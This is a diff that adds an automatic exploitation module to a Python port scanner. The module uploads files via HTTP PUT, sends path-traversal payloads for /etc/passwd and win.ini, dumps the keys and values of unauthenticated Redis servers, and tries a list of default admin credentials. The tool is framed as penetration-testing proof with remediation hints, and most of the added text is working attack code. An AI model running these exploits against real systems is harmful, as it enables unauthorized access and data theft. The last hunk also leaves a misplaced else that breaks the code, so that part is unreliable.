@@ -426,6 +426,231 @@ SERVICE_HANDLERS = {
     27017: ("MongoDB", check_mongodb),
 }
 
+# ═══════════════════════════════════════════════════════════
+# 🎯 EXPLOITATION PoC — Real exploitation proof, not just theory
+# ═══════════════════════════════════════════════════════════
+
+def exploit_put_method(host, port, ssl_mode=False):
+    """Upload a proof file via PUT, verify it's accessible."""
+    protocol = "https" if ssl_mode else "http"
+    findings = []
+    proof_filename = f"ares-{int(time.time())}.txt"
+    proof_content = f"ARES_HARPOON_PROOF_{int(time.time())}"
+    
+    print(f"\n    🎯 Testing PUT exploitation...")
+    try:
+        sock = socket.create_connection((host, port), timeout=5)
+        if ssl_mode:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=host)
+        
+        body = proof_content.encode()
+        req = (
+            f"PUT /{proof_filename} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: text/plain\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Connection: close\r\n"
+            f"\r\n"
+        ).encode() + body
+        
+        sock.sendall(req)
+        resp = sock.recv(4096).decode(errors="ignore")
+        sock.close()
+        
+        sc = resp.split(" ")[1] if len(resp.split(" ")) > 1 else "000"
+        
+        if sc in ("200", "201", "204"):
+            print(f"    🔴 FILE UPLOADED via PUT!")
+            print(f"    Proof: {protocol}://{host}:{port}/{proof_filename}")
+            try:
+                vsock = socket.create_connection((host, port), timeout=5)
+                if ssl_mode:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    vsock = ctx.wrap_socket(vsock, server_hostname=host)
+                vsock.sendall(f"GET /{proof_filename} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
+                vresp = vsock.recv(4096).decode(errors="ignore")
+                vsock.close()
+                if proof_content in vresp:
+                    print(f"    🔴 FILE IS ACCESSIBLE AND READABLE!")
+                    findings.append(("critical", f"PUT method exploitable: file uploaded and accessible",
+                        f"Proof URL: {protocol}://{host}:{port}/{proof_filename}",
+                        "Disable PUT method immediately"))
+                    try:
+                        dsock = socket.create_connection((host, port), timeout=5)
+                        if ssl_mode:
+                            ctx = ssl.create_default_context()
+                            ctx.check_hostname = False
+                            ctx.verify_mode = ssl.CERT_NONE
+                            dsock = ctx.wrap_socket(dsock, server_hostname=host)
+                        dsock.sendall(f"DELETE /{proof_filename} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
+                        dsock.recv(1024)
+                        dsock.close()
+                        print(f"    ✅ Proof file deleted")
+                    except:
+                        print(f"    ⚠️ Manual cleanup: /{proof_filename}")
+                else:
+                    findings.append(("high", "PUT allowed (upload failed verification)", "", "Disable PUT"))
+            except:
+                findings.append(("high", "PUT possibly enabled", "", "Verify and disable PUT"))
+        elif sc in ("401", "403", "405"):
+            print(f"    ℹ️ PUT rejected ({sc})")
+        else:
+            print(f"    ℹ️ PUT response: {sc}")
+    except Exception as e:
+        print(f"    ❌ PUT test failed: {str(e)[:60]}")
+    return findings
+
+
+def exploit_path_traversal(host, port, ssl_mode=False):
+    """Test for path traversal via URL parameters."""
+    findings = []
+    payloads = [
+        ("../../../../etc/passwd", "root:x:0:0:"),
+        ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
+        ("/etc/passwd", "root:x:0:0:"),
+    ]
+    params = ["file", "page", "path", "dir", "doc", "include", "load", "f", "p"]
+    print(f"\n    🎯 Testing Path Traversal...")
+    found = False
+    for trav_path, check in payloads:
+        for param in params[:3]:
+            try:
+                sock = socket.create_connection((host, port), timeout=5)
+                if ssl_mode:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=host)
+                sock.sendall(f"GET /?{param}={quote(trav_path)} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
+                resp = sock.recv(8192).decode(errors="ignore")
+                sock.close()
+                if check in resp and "404" not in resp[:20]:
+                    print(f"    🔴 PATH TRAVERSAL via ?{param}=")
+                    proof = resp[resp.find(check)-30:resp.find(check)+100]
+                    findings.append(("critical", f"Path traversal via ?{param}=",
+                        f"Payload: {trav_path}\nProof: {proof[:150]}",
+                        "Sanitize file path inputs"))
+                    found = True; break
+            except:
+                pass
+        if found: break
+    if not found:
+        print(f"    ✅ No path traversal detected")
+    return findings
+
+
+def exploit_redis_keys(host, port=6379):
+    """If Redis is accessible without auth, dump keys as proof."""
+    findings = []
+    print(f"\n    🎯 Exploiting Redis (dumping keys)...")
+    try:
+        sock = socket.create_connection((host, port), timeout=5)
+        sock.sendall(b"PING\r\n")
+        if b"PONG" not in sock.recv(1024):
+            sock.close(); return findings
+        sock.sendall(b"KEYS *\r\n")
+        keys_resp = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk: break
+                keys_resp += chunk
+        except:
+            pass
+        sock.close()
+        keys_list = re.findall(r'\$(\d+)\r\n(.+?)\r\n', keys_resp.decode(errors="ignore"))
+        if keys_list:
+            print(f"    🔴 Redis has {len(keys_list)} keys accessible!")
+            for size, key in keys_list[:5]:
+                print(f"      Key: {key}")
+                try:
+                    gsock = socket.create_connection((host, port), timeout=3)
+                    gsock.sendall(f"GET {key}\r\n".encode())
+                    gresp = gsock.recv(4096).decode(errors="ignore")
+                    gsock.close()
+                    vm = re.search(r'\$(\d+)\r\n(.+?)\r\n', gresp)
+                    if vm:
+                        val = vm.group(2)[:100]
+                        findings.append(("critical", f"Redis key exposed: {key}", f"Value: {val}", "Set requirepass"))
+                except:
+                    pass
+            findings.append(("critical", f"Redis has {len(keys_list)} keys accessible without auth", "", "Enable authentication"))
+        else:
+            findings.append(("high", "Redis accessible (no auth), no keys found", "", "Set requirepass"))
+    except Exception as e:
+        print(f"    ❌ Redis exploit failed: {str(e)[:60]}")
+    return findings
+
+
+def exploit_default_login(host, port, ssl_mode=False):
+    """Try default credentials on admin panels."""
+    findings = []
+    targets = [
+        ("/admin", [("admin","admin"),("admin","password"),("admin","123456"),("admin","admin123"),("root","root"),("tomcat","tomcat"),("user","user")]),
+        ("/manager", [("tomcat","tomcat"),("admin","admin")]),
+        ("/administrator", [("admin","admin"),("admin","password")]),
+    ]
+    print(f"\n    🎯 Testing default credentials...")
+    for path, creds in targets:
+        for user, pwd in creds:
+            try:
+                auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+                sock = socket.create_connection((host, port), timeout=5)
+                if ssl_mode:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=host)
+                sock.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nAuthorization: Basic {auth}\r\nConnection: close\r\n\r\n".encode())
+                resp = sock.recv(4096).decode(errors="ignore")
+                sock.close()
+                sc = resp.split(" ")[1] if len(resp.split(" ")) > 1 else ""
+                if sc == "200" and "401" not in resp[:50]:
+                    print(f"    🔴 AUTHENTICATED: {user}:{pwd} on {path}")
+                    findings.append(("critical", f"Default credentials work on {path}",
+                        f"Credentials: {user}:{pwd}\nFull access granted",
+                        "Change default credentials immediately"))
+                    break
+            except:
+                pass
+    if not findings:
+        print(f"    ✅ No default credentials worked")
+    return findings
+
+
+# ─── Exploit dispatch ───
+EXPLOIT_HANDLERS = {
+    80:  ["put", "traversal", "default_login"],
+    443: ["put", "traversal", "default_login"],
+    8080:["put", "traversal", "default_login"],
+    8443:["put", "traversal", "default_login"],
+    6379:["redis_keys"],
+}
+
+def run_exploits(host, port, ssl_mode=False):
+    """Run all applicable PoC exploits for a given port."""
+    exploit_map = {
+        "put": exploit_put_method,
+        "traversal": exploit_path_traversal,
+        "redis_keys": exploit_redis_keys,
+        "default_login": exploit_default_login,
+    }
+    findings = []
+    if port in EXPLOIT_HANDLERS:
+        for exp_name in EXPLOIT_HANDLERS[port]:
+            try:
+                fn = exploit_map[exp_name]
+                result = fn(host, port, ssl_mode)
+                findings.extend(result)
+            except Exception as e:
+                print(f"    ❌ Exploit {exp_name} failed: {str(e)[:60]}")
+    return findings
+
 
 def main():
     if len(sys.argv) < 2:
@@ -475,6 +700,12 @@ def main():
                 except Exception as e:
                     print(f"    Error: {e}")
                     report.add_finding("medium", f"Service on port {port} errored during check", str(e)[:100])
+
+            # 🎯 Run exploitation PoC
+            ssl_mode = port in (443, 8443, 8443)
+            for sev, title, *rest in run_exploits(host, port, ssl_mode):
+                report.add_finding(sev, title, rest[0] if rest else "", rest[1] if len(rest) > 1 else "")
+            
             else:
                 print(f"    ℹ️ No handler for port {port}")
                 report.add_finding("low", f"Unknown service on port {port}", "", "Investigate manually")
